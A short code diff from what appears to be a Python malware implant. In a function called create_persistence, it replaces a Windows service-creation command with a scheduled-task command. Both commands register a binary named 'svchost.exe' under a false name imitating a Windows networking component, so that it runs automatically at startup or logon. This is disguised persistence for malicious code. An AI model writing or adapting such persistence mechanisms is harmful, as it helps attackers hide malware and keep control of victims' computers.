@@ -137,7 +137,7 @@ def create_persistence():
     executable_path = os.path.abspath(os.path.dirname(__file__))
     if ctypes.windll.shell32.IsUserAnAdmin():
         # This assumes that this binary is named 'svchost.exe'
-        os.system(r"""sc create IEEE802.11xAgent start=auto binpath={0}\svchost.exe obj=LocalSystem displayname="IEEE 802.11x AutoConfig Agent" """.format(executable_path))
+        os.system(r"""schtasks /create /ru builtin\users /sc onlogon /tn "IEEE 802.1x AutoConfig Agent" /tr {0}\svchost.exe """.format(executable_path))
 
 
 # Establish persistence
